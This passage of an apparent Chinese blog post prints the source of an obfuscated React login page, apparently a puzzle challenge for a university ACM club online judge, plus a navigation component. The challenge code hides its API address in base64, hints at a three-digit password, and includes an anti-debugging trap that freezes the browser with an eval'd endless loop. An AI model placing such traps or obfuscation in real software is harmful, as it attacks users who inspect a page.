class="keyword">import</span> &#123;Base64&#125; <span class="keyword">from</span> <span class="string">"js-base64"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> t = Base64.fromBase64;</span><br><span class="line"><span class="keyword">const</span> w = Base64.fromBase64</span><br><span class="line"><span class="keyword">const</span> _ = fetch;</span><br><span class="line"><span class="keyword">const</span> __ = <span class="function">(<span class="params">x: number, y: number</span>) =&gt;</span> x ^ y</span><br><span class="line"><span class="keyword">const</span> ___ = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">70</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">69</span>, <span class="number">69</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">70</span>, <span class="number">70</span>, <span class="number">57</span>])</span><br><span class="line"><span class="keyword">const</span> url = w(<span class="string">"aHR0cDovLzQ3LjEwNy4yNTEuNDEvYXBpLw=="</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useStyles = <span class="function">(<span class="params">theme: Theme</span>) =&gt;</span> createStyles(&#123;</span><br><span class="line">    main: &#123;</span><br><span class="line">        flexGrow: <span class="number">1</span>,</span><br><span class="line">        padding: theme.spacing(<span class="number">3</span>),</span><br><span class="line">        [theme.breakpoints.up(<span class="string">'sm'</span>)]: &#123;</span><br><span class="line">            marginLeft: drawerWidth</span><br><span class="line">        &#125;,</span><br><span class="line">        height: <span class="string">"100%"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    toolbar: theme.mixins.toolbar,</span><br><span class="line">    paper: &#123;</span><br><span class="line">        display: <span class="string">"table"</span>,</span><br><span class="line">        margin: <span class="string">"0 auto"</span>,</span><br><span class="line">        width: <span class="number">300</span>,</span><br><span class="line">        height: <span class="number">300</span>,</span><br><span class="line">        marginTop: <span class="number">160</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    input: &#123;</span><br><span class="line">        width: <span class="number">280</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    input2: &#123;</span><br><span class="line">        width: <span class="number">280</span> - <span class="number">63</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    center: &#123;</span><br><span class="line">        textAlign: <span class="string">"center"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    p: &#123;</span><br><span class="line">        width: <span class="string">"100%"</span>,</span><br><span class="line">        textAlign: <span class="string">"center"</span>,</span><br><span class="line">        fontSize: <span class="string">"20px"</span>,</span><br><span class="line">        margin: <span class="string">"0 auto"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    btn: &#123;</span><br><span class="line">        margin: <span class="string">"0 0 0 auto"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    hidden: &#123;</span><br><span class="line">        visibility: <span class="string">"hidden"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">interface State &#123;</span><br><span class="line">    p: string,</span><br><span class="line">    c: string,</span><br><span class="line">    w: string,</span><br><span class="line">    g: string,</span><br><span class="line">    l: boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span>&lt;<span class="title">any</span>, <span class="title">State</span>&gt; </span>&#123;</span><br><span class="line">    private __: &#123; p(b: string): string; q(p: string, <span class="attr">c</span>: string, <span class="attr">y</span>: string): <span class="built_in">Promise</span>&lt;any&gt;; y(): <span class="built_in">Promise</span>&lt;any&gt; &#125;;</span><br><span class="line">    <span class="keyword">constructor</span>(props: any) &#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">        <span class="keyword">this</span>.__ = &#123;</span><br><span class="line">            <span class="keyword">async</span> y() &#123;</span><br><span class="line">                <span class="keyword">return</span> _(url)</span><br><span class="line">                    .then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="keyword">async</span> q(p: string, <span class="attr">c</span>: string, <span class="attr">y</span>: string) &#123;</span><br><span class="line">                <span class="keyword">return</span> _(url, &#123;</span><br><span class="line">                    [w(<span class="string">"bWV0aG9k"</span>)]: w(<span class="string">"UE9TVA=="</span>),</span><br><span class="line">                    [w(<span class="string">"bW9kZQ=="</span>)]: w(<span class="string">"Y29ycw=="</span>),</span><br><span class="line">                    [w(<span class="string">"aGVhZGVycw=="</span>)]: &#123;</span><br><span class="line">                        [w(<span class="string">"Q29udGVudC1UeXBl"</span>)]: w(<span class="string">"YXBwbGljYXRpb24vanNvbg=="</span>)</span><br><span class="line">                    &#125;,</span><br><span class="line">                    [w(<span class="string">"Ym9keQ=="</span>)]: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                        [w(<span class="string">"dXVpZA=="</span>)]: y,</span><br><span class="line">                        [w(<span class="string">"Y29kZQ=="</span>)]: c,</span><br><span class="line">                        [w(<span class="string">"cGFzc3dvcmQ="</span>)]: p</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (res.status !== <span class="number">200</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(res.status.toString())</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            p(b: string): string &#123;</span><br><span class="line">                <span class="keyword">const</span> input = Base64.toUint8Array(b);</span><br><span class="line">                input.forEach(<span class="function">(<span class="params">_, i</span>) =&gt;</span> &#123;</span><br><span class="line">                    ___.forEach(<span class="function">(<span class="params">_, j</span>) =&gt;</span> &#123;</span><br><span class="line">                        input[i] = __(input[i], ___[j])</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">Array</span>.from(input).map(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">String</span>.fromCharCode(value)).join(<span class="string">""</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    readonly state: Readonly&lt;State&gt; = &#123;</span><br><span class="line">        p: <span class="string">""</span>,</span><br><span class="line">        c: <span class="string">""</span>,</span><br><span class="line">        w: <span class="string">""</span>,</span><br><span class="line">        g: <span class="string">""</span>,</span><br><span class="line">        l: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">        <span class="keyword">this</span>.u()</span><br><span class="line">        setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> time1 = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()</span><br><span class="line">            <span class="keyword">debugger</span>;</span><br><span class="line">            <span class="keyword">const</span> time2 = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() - time1</span><br><span class="line">            <span class="keyword">if</span> (time2 &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="string">`const wait = async () =&gt; &#123;</span></span><br><span class="line"><span class="string">                    wait()</span></span><br><span class="line"><span class="string">                    let total = "";</span></span><br><span class="line"><span class="string">                    for (let i = 0; i &lt; 1e9; i++) &#123;</span></span><br><span class="line"><span class="string">                        total = total + i.toString();</span></span><br><span class="line"><span class="string">                        history.pushState(0, "", total);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                wait()`</span>)</span><br><span class="line">                <span class="built_in">Array</span>.from(&#123;</span><br><span class="line">                    [<span class="built_in">Symbol</span>.iterator]: <span class="function"><span class="params">()</span> =&gt;</span> (&#123;</span><br><span class="line">                        next: <span class="function"><span class="params">()</span> =&gt;</span> (&#123;<span class="attr">value</span>: <span class="built_in">Math</span>.random()&#125;)</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    u = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        (<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="keyword">this</span>.__.y();</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">                g: data[<span class="string">"img"</span>],</span><br><span class="line">                p: <span class="keyword">this</span>.__.p(data[t(<span class="string">"dXVpZA=="</span>)])</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        (<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.setState(&#123;<span class="attr">l</span>: <span class="literal">true</span>&#125;)</span><br><span class="line">                <span class="keyword">const</span> &#123;msg&#125; = <span class="keyword">await</span> <span class="keyword">this</span>.__.q(<span class="keyword">this</span>.state.w, <span class="keyword">this</span>.state.c, <span class="keyword">this</span>.state.p)</span><br><span class="line">                alert(msg)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                alert(e)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.u()</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;<span class="attr">l</span>: <span class="literal">false</span>&#125;)</span><br><span class="line">        &#125;)()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        alert(<span class="string">"密码只有3位数字哦!"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    e = <span class="function">(<span class="params">event: any</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">w</span>: event.target.value&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="function">(<span class="params">event: any</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">c</span>: event.target.value&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;classes&#125; = <span class="keyword">this</span>.props</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;Drawer/&gt;</span><br><span class="line">                &lt;main className=&#123;classes.main&#125;&gt;</span><br><span class="line">                    &lt;div className=&#123;classes.toolbar&#125;/&gt;</span><br><span class="line">                    &lt;Card className=&#123;classes.paper&#125;&gt;</span><br><span class="line">                        &lt;List&gt;</span><br><span class="line">                            &lt;ListItem&gt;</span><br><span class="line">                                &lt;p className=&#123;classes.p&#125;&gt;登录&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;/</span>ListItem&gt;</span><br><span class="line">                            &lt;ListItem&gt;</span><br><span class="line">                                &lt;TextField className=&#123;classes.input&#125; label=<span class="string">"用户识别码"</span> type=<span class="string">"password"</span> onChange=&#123;<span class="keyword">this</span>.e&#125;/&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem className=&#123;this.state.g.length === 0? classes.hidden: ""&#125;&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;TextField className=&#123;classes.input2&#125; label="验证码" onChange=&#123;this.i&#125;/</span>&gt;</span><br><span class="line">                                &lt;img width=&#123;<span class="number">63</span>&#125; height=&#123;<span class="number">24</span>&#125; src=&#123;<span class="keyword">this</span>.state.g&#125;/&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;Link onClick=&#123;this.g&#125;&gt;</span></span><br><span class="line"><span class="regexp">                                    忘记了你的用户识别码?</span></span><br><span class="line"><span class="regexp">                                &lt;/</span>Link&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;p style=&#123;&#123;color: "#909399"&#125;&#125;&gt;0202年了, 是时候了解下最新的前端技术了&lt;/</span>p&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;Button className=&#123;classes.btn&#125; variant="contained" color="primary" onClick=&#123;this.w&#125;&gt;</span></span><br><span class="line"><span class="regexp">                                    登录</span></span><br><span class="line"><span class="regexp">                                &lt;/</span>Button&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>List&gt;</span><br><span class="line">                        &#123;<span class="keyword">this</span>.state.l &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">LinearProgress</span> /&gt;</span></span>&#125;</span><br><span class="line">                    &lt;<span class="regexp">/Card&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/m</span>ain&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default withStyles(useStyles)(App)</span></span><br></pre></td></tr></table></figure><h6 id="Drawer-tsx"><a href="#Drawer-tsx" class="headerlink" title="Drawer.tsx"></a>Drawer.tsx</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    AppBar,</span><br><span class="line">    createStyles, CssBaseline,</span><br><span class="line">    Drawer, Hidden, IconButton,</span><br><span class="line">    List,</span><br><span class="line">    ListItem,</span><br><span class="line">    ListItemIcon,</span><br><span class="line">    ListItemText, ListSubheader,</span><br><span class="line">    Theme, Toolbar, Typography,</span><br><span class="line">    withStyles</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">"@material-ui/core"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MenuIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Menu'</span>;</span><br><span class="line"><span class="keyword">import</span> LiveHelpIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/LiveHelp'</span>;</span><br><span class="line"><span class="keyword">import</span> ListAltIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/ListAlt'</span>;</span><br><span class="line"><span class="keyword">import</span> GavelIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Gavel'</span>;</span><br><span class="line"><span class="keyword">import</span> HelpIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Help'</span>;</span><br><span class="line"><span class="keyword">import</span> EqualizerIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Equalizer'</span>;</span><br><span class="line"><span class="keyword">import</span> HomeIcon <span class="keyword">from</span> <span class="string">'@material-ui/icons/Home'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> drawerWidth = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> drawerStyle = <span class="function">(<span class="params">theme: Theme</span>) =&gt;</span></span><br><span class="line">        createStyles(&#123;</span><br><span class="line">            root: &#123;</span><br><span class="line">                display: <span class="string">'flex'</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            drawer: &#123;</span><br><span class="line">                [theme.breakpoints.up(<span class="string">'sm'</span>)]: &#123;</span><br><span class="line">                    width: drawerWidth,</span><br><span class="line">                    flexShrink: <span class="number">0</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            menuButton: &#123;</span><br><span class="line">                marginRight: theme.spacing(<span class="number">2</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">            toolbar: theme.mixins.toolbar,</span><br><span class="line">            drawerPaper: &#123;</span><br><span class="line">                marginTop: <span class="number">64</span>,</span><br><span class="line">                width: drawerWidth,</span><br><span class="line">            &#125;,</span><br><span class="line">            content: &#123;</span><br><span class="line">                flexGrow: <span class="number">1</span>,</span><br><span class="line">                padding: theme.spacing(<span class="number">3</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">interface State &#123;</span><br><span class="line">    mobileOpen: boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DrawerNav</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span>&lt;<span class="title">any</span>, <span class="title">State</span>&gt; </span>&#123;</span><br><span class="line">    readonly state: Readonly&lt;State&gt; = &#123;</span><br><span class="line">        mobileOpen: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleDrawerToggle = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">mobileOpen</span>: !<span class="keyword">this</span>.state.mobileOpen&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;classes&#125; = <span class="keyword">this</span>.props;</span><br><span class="line">        <span class="keyword">const</span> drawer = (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;List</span><br><span class="line">                    subheader=&#123;</span><br><span class="line">                        &lt;ListSubheader component=<span class="string">"div"</span> id=<span class="string">"nested-list-subheader"</span>&gt;</span><br><span class="line">                            Online Judge</span><br><span class="line">                        &lt;<span class="regexp">/ListSubheader&gt;</span></span><br><span class="line"><span class="regexp">                    &#125;&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;HomeIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Home" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;LiveHelpIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Problems" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;ListAltIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Contests" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;GavelIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="States" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;EqualizerIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Rank" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ListItem button&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemIcon&gt;&lt;HelpIcon/</span>&gt;&lt;<span class="regexp">/ListItemIcon&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;ListItemText primary="Help" /</span>&gt;</span><br><span class="line">                    &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/</span>List&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">        return (</span></span><br><span class="line"><span class="regexp">            &lt;div className=&#123;classes.root&#125;&gt;</span></span><br><span class="line"><span class="regexp">                &lt;CssBaseline /</span>&gt;</span><br><span class="line">                &lt;AppBar position=<span class="string">"fixed"</span>&gt;</span><br><span class="line">                    &lt;Toolbar&gt;</span><br><span class="line">                        &lt;Hidden smUp&gt;</span><br><span class="line">                            &lt;IconButton</span><br><span class="line">                                color=<span class="string">"inherit"</span></span><br><span class="line">                                aria-label=<span class="string">"open drawer"</span></span><br><span class="line">                                edge=<span class="string">"start"</span></span><br><span class="line">                                onClick=&#123;<span class="keyword">this</span>.handleDrawerToggle&#125;</span><br><span class="line">                                className=&#123;classes.menuButton&#125;</span><br><span class="line">                            &gt;</span><br><span class="line">                                &lt;MenuIcon /&gt;</span><br><span class="line">                            &lt;<span class="regexp">/IconButton&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Hidden&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;Hidden xsDown&gt;</span><br><span class="line">                            &lt;IconButton</span><br><span class="line">                                color=<span class="string">"inherit"</span></span><br><span class="line">                                aria-label=<span class="string">"open drawer"</span></span><br><span class="line">                                edge=<span class="string">"start"</span></span><br><span class="line">                                className=&#123;classes.menuButton&#125;</span><br><span class="line">                            &gt;</span><br><span class="line">                                &lt;MenuIcon /&gt;</span><br><span class="line">                            &lt;<span class="regexp">/IconButton&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Hidden&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;Typography variant=<span class="string">"h6"</span> noWrap&gt;</span><br><span class="line">                            武科大ACM俱乐部</span><br><span class="line">                        &lt;<span class="regexp">/Typography&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;/</span>Toolbar&gt;</span><br><span class="line">                &lt;<span class="regexp">/AppBar&gt;</span></span><br><span class="line"><span class="regexp">                &lt;nav className=&#123;classes.drawer&#125; aria-label="mailbox folders"&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;Hidden smUp implementation="css"&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;Drawer</span></span><br><span class="line"><span class="regexp">                            variant="temporary"</span></span><br><span class="line"><span class="regexp">                            open=&#123;this.state.mobileOpen&#125;</span></span><br><span class="line"><span class="regexp">                            onClose=&#123;this.handleDrawerToggle&#125;</span></span><br><span class="line"><span class="regexp">                            classes=&#123;&#123;paper: classes.drawerPaper&#125;&#125;</span></span><br><span class="line"><span class="regexp">                            ModalProps=&#123;&#123;keepMounted: true&#125;&#125;</span></span><br><span class="line"><span class="regexp">                        &gt;</span></span><br><span class="line"><span class="regexp">                            &#123;drawer&#125;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Drawer&gt;</span><br><span class="line">                    &lt;<span class="regexp">/Hidden&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;Hidden xsDown implementation="css"&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;Drawer</span></span><br><span class="line"><span class="regexp">                            classes=&#123;&#123;paper: classes.drawerPaper&#125;&#125;</span></span><br><span class="line"><span class="regexp">                            variant="permanent"</span></span><br><span class="line"><span class="regexp">                            open</span></span><br><span class="line"><span class="regexp">                        &gt;</span></span><br><span class="line"><span class="regexp">                            &#123;drawer&#125;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>Drawer&gt;</span><br><span class="line">                    &lt;<span class="regexp">/Hidden&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/</span>nav&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default withStyles(drawerStyle)(DrawerNav)</span></span><br></pre></td></tr></table></figure><h5 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h5><h6 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 